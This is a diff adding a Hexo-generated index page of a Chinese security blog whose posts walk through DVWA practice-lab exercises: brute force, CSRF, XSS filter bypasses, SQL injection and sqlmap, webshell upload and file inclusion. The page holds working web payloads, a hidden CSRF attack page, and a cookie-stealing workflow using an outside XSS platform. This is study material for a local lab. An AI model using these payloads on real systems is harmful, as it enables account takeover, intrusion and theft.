@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="WJW&#39;s Blog">
+<meta property="og:url" content="http://example.com/page/4/index.html">
+<meta property="og:site_name" content="WJW&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="WJW">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>WJW's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="WJW's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">WJW's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/10/Force/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/10/Force/" class="post-title-link" itemprop="url">Brute Force</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-10 16:34:23" itemprop="dateCreated datePublished" datetime="2021-01-10T16:34:23+08:00">2021-01-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:34:42" itemprop="dateModified" datetime="2021-05-23T09:34:42+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>791</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p>
+<ul>
+<li>low<br>查看源码，可以发现，服务器只是验证参数login是否设置，<br>isset函数在服务器中检测变量是否被设置，返回true/false，没有任何防爆机制，且存在sql注入。<br>方法一(sql注入)：在username框输入admin’# 或者 admin’ or ‘1’=’1即可成功登陆。<br>原理为 and的优先级高于or。<br>方法二(burp爆破)抓包下来，放到intruder爆破，只对参数password进行爆破，<br><img src="Force.md/1.png"><br>换到payload，再添加字典，最后开始attack。<br><img src="Force.md/2.png"><br>成功爆破，返回页面长度和其他不一样的。<br><img src="Force.md/3.png"></li>
+<li>medium<br>可以看到，medium级别的代码对用户输入的参数进行了简单的过滤，对一些预定义字符进行了转义，基本上防止了SQL注入。<br>还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交。<br>用burp爆破与low操作一样，只是少了sql注入。</li>
+<li>high<br>使用了Anti-CSRF token来抵御CSRF攻击，使用了函数stripslashes和mysqli_real_esacpe_string来抵御sql注入和xss攻击。<br>由于使用了Anti-CSRF token，每次服务器返回登陆页面都会包含一个随机的user_token值，每次用户登陆要一起提交，<br>所以服务器接到请求，会先检查user_token值，再进行sql查询，所以使用不再使用burp的无脑爆破。<br>这里有两种方法：<br>方法一：写python脚本，先模拟服务器发出请求获得一个token值，再利用获得的token值进行爆破。(脚本后续补上)<br>方法二：还是可以使用burp爆破，需要修改一些设置。<br><img src="Force.md/4.png">参加两个爆破参数。<br>这里攻击类型也要相应修改，为pitchfock，线程设为1。<br>找到Grep-Extract模块进行相应设置，add：</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/09/CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/09/CSRF/" class="post-title-link" itemprop="url">CSRF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-09 14:08:01" itemprop="dateCreated datePublished" datetime="2021-01-09T14:08:01+08:00">2021-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:34:50" itemprop="dateModified" datetime="2021-05-23T09:34:50+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>893</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p><strong>CSRF，全称Cross-site request forgery，即跨站请求伪造，<br>是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意的链接或者访问包含攻击代码的页面，<br>在受害人不知情的情况下以受害者的身份向服务器，从而完成非法操作(如转账，改密等)。<br>CSRF与XSS最大区别：CSRF并没有盗用cookie而是直接利用。</strong></p>
+<ul>
+<li>low<br>查看源码，服务器收到修改密码的请求后，会检查pass_new和pass_conf是否一致，如果相同，就会修改密码，并没有做任何的csrf机制。<br>当受害者点击了这个链接，他的密码就会被改成password，<br><img src="CSRF.md/1.png"><br><code>http://localhost/vulnerabilities/csrf/?password_new=000&amp;password_conf=000&amp;Change=Change#</code></li>
+<li><em>需要注意的是，csrf关键是利用受害者cookie发送伪造请求，要求之前登陆的这个系统和点击这个链接使用的是同一个浏览器的cookie。</em>*<br>方法一：这样的链接太暴露了，可以通过短链接隐藏url内容。<br>方法二：构造攻击页面：<br>`<img src="http://localhost/vulnerabilities/csrf/?password_new=000&password_conf=000&Change=Change#" border="0" style="display:none;"/><h1>404<h1>
+<h2>file not found.<h2>`    
+当受害者访问change.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了000。</li>
+<li>medium<br>查看源码，有个函数eregi(与ereg函数完全一致，只是忽略大小写)，检查了保留变量HTTP_REFFER(表示来自哪里)中是否包含SEVER_NAME（http包头的Host参数）来抵御CSRF攻击。<br>把构造攻击页面的代码文件名重命名为host参数。</li>
+<li>high<br>出现了一个Anti-CSRF token机制，关键在于获取token值，这里利用XSS注入获取。<br><code>&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)</code><br>使用这个方法一直弹不出token值，。。。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/08/xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/08/xss/" class="post-title-link" itemprop="url">XSS</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-08 10:57:41" itemprop="dateCreated datePublished" datetime="2021-01-08T10:57:41+08:00">2021-01-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:35:06" itemprop="dateModified" datetime="2021-05-23T09:35:06+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上是一种注入攻击，<br>是指黑客在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在浏览器执行，如获取用户cookie信息。<br>需要强调的是，XSS不仅仅限制于JavaScript，还包括flash等其他脚本语言。<br>根据恶意代码是否存储在服务器中，XSS可分为存储型XSS和反射型XSS。</strong></p>
+<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>查看源码，代码直接引用name参数，且没有进行过滤和检查，存在明显的XSS漏洞。<br>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br><img src="xss.md/1.png"></p>
+<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>多了str_replace函数，把<code>&lt;script&gt;</code>过滤了。<br>方法一：双写绕过。<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code><br>方法二：大小写绕过。<code>&lt;SCRipt&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br>正则表达式很强大。<br><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code><br>所以这里无法通过<code>&lt;script&gt;</code>标签注入XSS代码了，但是可以找img，body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>了解三个函数，有的是之前见过了，再复习一下。<br>trim(string,charlist)<br>函数移除字符串两侧的空白字符或其他预定字符，如\t,\n,\x0B\r以及空格，可选参数charlist支持添加额外需要删除的字符。<br>mysql_real_escape_string(string,connection)函数会对字符串中的特殊符号(\x00,\n,\r,’,”,\x1a)进行转义。<br>stripslashes(string)<br>函数删除字符串中的反斜杠。<br>这里没有对XXS方面进行过滤和检查，且存储在数据库中，明显存在存储型XSS漏洞。<br>方法一：尝试在name端输入，有字数限制，可以抓包修改上传。<br>方法二：直接在message内输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>name里随便输入就行，成功出现弹窗。</p>
+<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>这里无法对message参数进行注入，message被htmlspecialchars函数进行编码，但是name只简单进行了<code>&lt;script&gt;</code>过滤，所以<br>抓包后，双写，或者大小写绕过。</p>
+<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>message还是被htmlspecialchars函数进行编码，name使用了正则表达式替换，所以可以同上面反射型方法一样，对其他标签注入。<br>抓包下来，该name参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code>即可。</p>
+<h3 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h3><h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><p>查看源码，php内没任何东西，可以进行任意操作。直接在payload上输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>,成功弹窗。<br><img src="xss.md/2.png"></p>
+<h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><p>Stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>检测default值中是否有 &lt;script  ，如果有的话，则将 default=English ,就不能双写，大小写绕过了。<br>这里通过img标签注入，输入<code>&lt;img src=1 onerror=alert(1)&gt;</code>，没有出现弹窗，检查页面源代码。<br><img src="xss.md/3.png"><br>语句被插入了value，但没有插入到option，所以img标签没有起到作用，这里闭合option标签。<br>原理：<code>&lt;option value=&#39;     &quot; + lang + &quot;      &#39;&gt;  &quot;  + decodeURI(lang) +  &quot;  &lt;/option&gt;</code><br>所以构造，<code>&gt;&lt;/option&gt;&lt;img src=1 οnerrοr=alert(1)&gt; </code><br><img src="xss.md/4.png"><br>只有&gt;插入，option标签的值，因为</option>闭合了option标签，所以img标签并没有插入。<br>继续构造闭合select标签，这样img标签就是独立的一条语句。<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>成功插入页面。<br>![](xss.md/5.png<br>补充：<br>基本payload：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;body onload=alert(1)&gt;</code><br><code>&lt;input onclick=alert(1)&gt;</code><br><code>&lt;img src=1 onerror=alert(1)&gt;</code><br><code>&lt;a href=javascript:alert(1)&gt;</code></p>
+<h3 id="XSSER的使用步骤"><a href="#XSSER的使用步骤" class="headerlink" title="XSSER的使用步骤"></a>XSSER的使用步骤</h3><p>网站：<a target="_blank" rel="noopener" href="https://xss.pt/xss.php?do=login">https://xss.pt/xss.php?do=login</a><br>1、登陆，创建项目，默认，keep。<br>2、拷贝代码，植入。<br>3、在XSSER框架等待受害者的Cookie。<br>4、攻击者浏览项目，便可获得受害者会话信息。<br>5、把Cookie值全部填入Cookie-editor或者使用burp修改Cookie值。</p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/06/dvwa/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/06/dvwa/" class="post-title-link" itemprop="url">dvwa</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-06 21:20:31" itemprop="dateCreated datePublished" datetime="2021-01-06T21:20:31+08:00">2021-01-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:34:44" itemprop="dateModified" datetime="2021-05-23T09:34:44+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><em>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。</em></p>
+<h4 id="low级别："><a href="#low级别：" class="headerlink" title="low级别："></a>low级别：</h4><h5 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h5><p>输入1 or ‘1’=’1 ,语句执行，返回结果，为单引号字符型注入。<br><img src="dvwa.md/1.png"></p>
+<h5 id="猜语句中字段数"><a href="#猜语句中字段数" class="headerlink" title="猜语句中字段数"></a>猜语句中字段数</h5><p><img src="dvwa.md/2.png"><br>输入3时报错，说明存在两个字段，即这里的First name和Surname。</p>
+<h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><p>用联合查询注入爆出数据库。<br><img src="dvwa.md/3.png"></p>
+<h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><p><img src="dvwa.md/4.png"><br>爆出两个表，guestbook，users，账户和密码应该就在users里。</p>
+<h5 id="爆users表中的字段名"><a href="#爆users表中的字段名" class="headerlink" title="爆users表中的字段名"></a>爆users表中的字段名</h5><p><img src="dvwa.md/5.png">获得八个字段。</p>
+<h5 id="最后查询用户账户密码"><a href="#最后查询用户账户密码" class="headerlink" title="最后查询用户账户密码"></a>最后查询用户账户密码</h5><p><img src="dvwa.md/6.png"></p>
+<h4 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h4><p>只能提交数字，抓包下来进行注入。</p>
+<h5 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h5><p>输入1 or 1=1<br><img src="dvwa.md/7.png">返回结果，为数字型注入。<br>爆表和爆库名还是老样子，但是到了爆表名出了问题，一直报错，应该是什么被过滤了。<br>试了直接获取数据库中的表，<br><img src="dvwa.md/8.png">可以执行，说明单引号被过滤了。通过十六进制绕过即可，后面的操作跟前面一样，只需把有单引号的改成十六进制即可。</p>
+<h4 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h4><p>也是单引号字符型注入，和low并无太大区别，只是多了limit 1限制查询，通过#注释掉即可。<br><em>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，<br>这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</em><br><img src="dvwa.md/9.png"></p>
+<h3 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h3><p><code>sqlmap.py -u &quot;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -dbs -threads 10 -batch</code><br>记得加双引号，才能指定参数提交。<br>这里还需要加cookie值，通过burp抓包，把cookie修改：<br><code>sqlmap.py -u &quot;http://localhost/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -dbs -threads 10 -batch -o</code></p>
+<h3 id="upload-文件上传"><a href="#upload-文件上传" class="headerlink" title="upload(文件上传)"></a>upload(文件上传)</h3><p>File Upload，即文件上传漏洞，<br>通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，<br>因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。<br>复习一下文件上传漏洞条件：<em>第一，文件可以被上传。第二，文件能够被执行。第三，上传文件路径可知。</em></p>
+<h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>没有对上传文件类型，内容进行过滤、检查，直接上穿一句话木马即可</p>
+<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>方法一:查看源码，对文件类型进行过滤，我们把文件改成jpg后缀后上传。<br>然后通过文件包含来解析一句话木马，文件包含要提前从low级别上传好<br><img src="dvwa.md/10.png">没解析时，是图片形式，一句话无法执行。文件包含后可以执行：<br><img src="dvwa.md/11.png"><br>方法二：抓包，修改文件类型，还有后缀改为php。<br>方法四:截断绕过。<br>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断。</p>
+<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>getimagesize(string filename)<br>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。<br>strrpos(string,find,start)<br>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。<br>方法一：绕过文件头，可以在文件头添加GIF89a。<br>方法二：上传图片马，再进行文件包含。<br>在upload-labs做过很多了，就不在赘述了。</p>
+<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。<br>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项<br>（选项开启之后，服务器允许包含一个远程的文件）,前面在做upload靶场后面的几关都使用了文件包含来解析一句话木马。</p>
+<h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>服务器没做任何过滤<br><strong>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong><br>后面补充：/etc/shadow<br>报错，显示没有此文件，说明不是Linux。<br><img src="dvwa.md/12.png"><br>但是知道了服务器文件的绝对路径，成功读取php.ini文件<br><img src="dvwa.md/13.png"><br>构造相对路径，加那么多..\，是为了保证能够到达服务器D盘的根目录。</p>
+<h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>源码中，过滤掉了https:// http:// ../ ..\ ，但是采用绝对路径不会被限制。<br>采用如图方式绕过，<br><img src="dvwa.md/14.png"></p>
+<h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。<br>使用file协议，前面的难度也都可以用file协议包含相应文件。<br><img src="dvwa.md/15.png"> </p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/28/3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/28/3/" class="post-title-link" itemprop="url">upload-labs18~21</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-28 22:28:05" itemprop="dateCreated datePublished" datetime="2020-12-28T22:28:05+08:00">2020-12-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-29 08:58:06" itemprop="dateModified" datetime="2021-05-29T08:58:06+08:00">2021-05-29</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
